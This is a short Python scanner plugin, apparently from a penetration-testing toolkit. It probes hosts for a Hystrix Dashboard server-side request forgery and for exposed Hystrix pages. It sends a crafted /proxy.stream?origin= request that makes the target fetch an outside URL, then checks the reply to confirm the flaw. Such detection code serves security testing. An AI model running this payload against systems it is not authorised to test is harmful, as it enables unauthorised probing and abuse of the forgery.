#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if is_intranet(ip):
        return

    base_url = "{}://{}:{}".format(service, ip, port)

    try:
        path = "/proxy.stream?origin=http%3A%2F%2Fbrowserkernel.baidu.com%2Fnewpac31%2Fvideoproxy.conf.txt"
        target = base_url + path

        r = await http_client(ip, port).get(target, timeout=20)

        if r.status_code == 200 and r.text.find("cloudnproxy.baidu.com:443") > 0:
            ret = {
                'alert_group': 'Hystrix SSRF',
                'affects': '{}'.format(target),
                'details': 'Hystrix SSRF: {}'.format(target)
            }
            return ret
    except Exception as e:
        debug(e)

    for path in ['/hystrix', '/hystrix/']:
        target = base_url + path
        try:
            r = await http_client(ip, port).get(target, timeout=20)
            if r.status_code == 200 and r.text.find("<title>Hystrix Dashboard") >= 0:
                ret = {
                    'alert_group': 'Hystrix SSRF',
                    'affects': '{}'.format(target),
                    'details': 'Hystrix SSRF: {}'.format(target)
                }
                return ret
        except Exception as e:
            debug(e)

    target = base_url + "/hystrix.stream"
    try:
        r = await http_client(ip, port).get(target, timeout=20)
        if r.status_code == 200 and "HystrixCommand" in r.text:
            ret = {
                'alert_group': 'Hystrix Stream',
                'affects': '{}'.format(target),
                'details': 'Hystrix Stream Info: {}'.format(target)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
